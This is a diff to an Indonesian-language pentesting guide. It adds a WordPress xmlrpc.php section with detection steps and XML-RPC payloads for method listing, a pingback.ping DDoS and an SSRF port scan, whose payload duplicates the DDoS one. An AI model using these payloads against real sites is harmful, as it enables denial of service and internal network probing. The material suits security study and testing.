@@ -18,10 +18,49 @@ Berikut merupakan beberapa *security misconfiguration* yang biasa terjadi pada p
 3. BuildWith
 4. WpScan
 
+### xmlrpc.php
+Ini merupakan kerentanan paling umum pada wordpress, cara mendeteksi kerentanan tersebut adalah sebagai berikut :
+* kunjungi site dari siteyangdituju.com/xmlrpc.php
+* Mendapatkan pesan error tentang *POST request only*
+
+Kemudian berikut cara melakukan exploitnya:
+* Lakukan *intercept* pada *request* dan ubah *method* GET ke POST
+* Kemudian masukan payload ini saat POST untuk melihat semua *Method* yang bisa digunakan
+    ```
+    <methodCall>
+    <methodName>system.listMethods</methodName>
+    <params></params>
+    </methodCall>
+    ```
+* Lihat apabila ada *method* ```pingback.ping``` pada list yang ditampilkan
+* Jika ada *method* diatas maka bisa dilakukan DDoS dengan *payload* berikut
+    ```
+    <methodCall>
+    <methodName>pingback.ping</methodName>
+    <params><param>
+    <value><string>http://<IP SERVER ANDA>:<port></string></value>
+    </param><param><value><string>http://<ALAMAT HOST YANG DIUJI></string>
+    </value></param></params>
+    </methodCall>
+    ```
+* Perform SSRF (Internal PORT scan only)
+    ```
+    <methodCall>
+    <methodName>pingback.ping</methodName>
+    <params><param>
+    <value><string>http://<IP SERVER ANDA>:<port></string></value>
+    </param><param><value><string>http://<ALAMAT HOST YANG DIUJI></string>
+    </value></param></params>
+    </methodCall>
+    ```
+
 ## Teknik Serangan pada platform Adobe Experience Manager
 
 ## Teknik Serangan pada platform Drupal
 
 ## Teknik Serangan pada platform Moodle
+
+## Author
+**[rad1zly](https://github.com/rad1zly)**
 
 
